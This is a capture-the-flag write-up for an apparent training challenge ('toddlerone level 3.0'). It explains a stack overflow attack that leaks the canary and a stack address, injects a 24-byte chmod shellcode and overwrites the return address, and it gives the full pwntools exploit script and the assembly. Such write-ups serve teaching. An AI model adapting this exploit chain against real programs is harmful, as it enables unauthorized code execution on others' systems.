# Exploitation Scenarios - Level 3.0
This challenge was amazingly educative, but i started by completing the level 3.1, i suggest looking at it before reading this writeup.

The challenge works the exact same way as in level 3.1 but this time we only have 24 bytes before we hit out canary, this mean our shellcode is restricted to a maximum of ~24 bytes (depending on the shellcode as it might mix assembly instruction with the canary value).

To recap, we need to overflow a buffer, leak the canary, use the backdoor to repeat the challenge function and this time we leak an address from the stack, then once we have these 2 values, we can overwrite the buffer with our shellcode + canary and overwrite our return address with the address of our input hence executing our shellcode.

The shellcode i use to solve this challenge is quite simple, we chmod a symlink named `a` to the `/flag` file allowing us to read the content of `/flag`.

```x86asm
.global _start
.intel_syntax noprefix
_start:
	push 0x61   # character "a"
	push rsp
	pop rdi
	mov sil, 4  # chmod value
	mov al, 90  # syscall number
	syscall
```

And of course i automated everything using python, therefore here's the script i use to solve this challenge.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template toddlerone_level3.0
from pwn import *
import pprint
# Set up pwntools for the correct architecture
exe = context.binary = ELF('toddlerone_level3.0')
context.arch = "amd64"
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

# 1. Start the Challenge, Set up some Variables
io = start()
padding_until_canary = 24
padding_until_return_address = padding_until_canary + 16
# 2. Leak the Canary
io.sendline(b"200")
payload = b"REPEAT" + b"A" * (padding_until_canary - len("REPEAT")) + b"A"
io.write(payload)
io.recvuntil(b"You said: ")
LeakedCanary = u64(io.readline()[25:][:7].rjust(8, b"\x00"))
log.info(f"Leaked Canary Value : {hex(LeakedCanary)}")
# 3. Leak an address stored on the stack
io.sendline(b"200")
payload = b"REPEAT" + b"A" * (32 - len("REPEAT"))
io.write(payload)
io.recvuntil(b"You said: ")
LeakedStackAddress = u64(io.recvline()[32:][:-1].ljust(8, b"\x00")) - 144 - 112
log.info(f"Leaked Stack Address : {hex(LeakedStackAddress)}")
# 4. Read Shellcode
shellcode = b""
with open("3.bytes", "rb") as file:
    for i in file.readlines():
        shellcode += i
# 5. Send the Final Exploit and Overwrite the Return Address
io.sendline(b"200")
payload = shellcode + b"\x90" * (padding_until_canary - len(shellcode)) + p64(LeakedCanary) + b"A" * (8) + p64(LeakedStackAddress)
io.write(payload)
# 5. Interactive Session
io.interactive()
io.close()
```
